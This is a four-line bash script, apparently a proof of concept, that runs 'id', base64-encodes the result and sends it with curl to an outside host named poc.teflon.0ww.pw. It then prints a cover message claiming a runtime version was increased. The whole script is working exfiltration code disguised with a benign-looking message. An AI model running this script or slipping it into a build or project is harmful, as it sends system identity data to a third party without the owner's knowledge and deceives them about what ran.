#!/bin/bash
PAYLOAD=$(id | base64)
curl -v "https://poc.teflon.0ww.pw/test?data=$PAYLOAD" 2>&1
echo "Runtime version has been increased. test"
